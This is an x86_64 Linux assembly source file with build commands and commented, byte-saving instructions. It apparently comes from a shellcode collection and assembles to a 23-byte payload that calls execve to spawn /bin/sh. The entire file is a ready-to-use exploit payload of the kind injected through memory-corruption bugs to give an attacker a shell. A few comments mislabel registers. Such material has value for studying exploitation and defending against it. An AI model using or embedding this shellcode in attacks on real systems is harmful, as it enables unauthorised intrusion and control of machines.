; lnx-execve-fast-x86_64.s
; Linux EXECVE(2) shellcode for x86_64 instruction set.
; 23 bytes shellcode using Linux x86_64 fast system calls.
; execve arguments are passed into registers directly.
; Used the 'push/pop' instructions in place of 'mov' and 'cdq/mul' to save a
; few more opcodes. All argument vectors are used: argv[2] and argv[3] holds a
; null register.
;
; Written by e3prom (github.com/e3prom)
;
; nasm -f elf64 lnx-execve-fast-x86_64.s
; ld lnx-execve-fast-x86_64.o -o lnx-execve-fast-x86_64
; objdump -d lnx-execve-fast-x86_64
BITS 64

section .text
  global _start

  _start:
    ; EXECVE(2) - execute program
    ;             int execve(const char *filename, char *const argv[], char *const envp[]);
    xor esi, esi			; Zero out RSI (argv2).
    push rsi				; Push value of RSI onto the stack so it's used as a string terminator.
    mov qword rbx, '/bin//sh'		; Copy the filename string into RBX.
    push rbx				; Push RDX onto the stack.
    push rsp				; Push pointer to the character array filename onto the stack.
    pop rdi				; Pop above pointer from the stack to RDI (argv1).
    cdq					; Zero out RDX (argv3)
    mul esi				; Multiply ESI (saving 1 byte over RSI as operand), so EAX is zero'ed.
    mov al, 0x3b			; Move '0x3b' to AL/EAX/RAX (execve syscall number).
    syscall				; Peform system call.
